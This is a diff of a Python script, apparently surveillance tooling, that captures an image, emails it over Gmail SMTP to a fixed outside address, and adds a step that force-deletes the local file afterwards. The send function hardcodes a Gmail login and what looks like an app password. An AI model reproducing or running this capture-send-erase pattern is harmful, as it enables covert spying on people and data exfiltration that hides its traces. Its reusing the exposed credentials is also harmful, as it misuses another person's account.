@@ -6,13 +6,12 @@ import ssl, smtplib
 from email.message import EmailMessage
 from email.mime.image import MIMEImage
 import subprocess
-import time
+
 
 # Ruta del path
 path = subprocess.run("powershell $env:tmp", stdout=subprocess.PIPE, universal_newlines=True, shell=True)
 path = path.stdout
 # Estanciamos los objetos a usarem = EmailMessage()
-context = ssl.create_default_context()
 
 
 def capture_image(image_name):
@@ -27,9 +26,11 @@ def capture_image(image_name):
 
 def send_image(path_image, email="juanmapipa4@gmail.com"):
     print ("Path image ==> ",path_image)
-   
+    print ("El correo va para => {}".format(email))
+    context = ssl.create_default_context()
+    em = EmailMessage()
     # Send Email
-    em['From'] = 'caca@gmailcom'
+    em['From'] = 'monolocacapop@gmailcom'
     em['To'] = email
     em['Subject'] = 'Capture Image'
 
@@ -43,5 +44,7 @@ def send_image(path_image, email="juanmapipa4@gmail.com"):
     with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
         smtp.login('monolocacapop', 'ngkdwjlpolfrzyop')
         smtp.sendmail('monolocacapop', email,em.as_string())
+    del em["To"]
 
-
+def remove_image(path):
+    rm_img = subprocess.run("powershell rm -Path {} -Force".format(path))
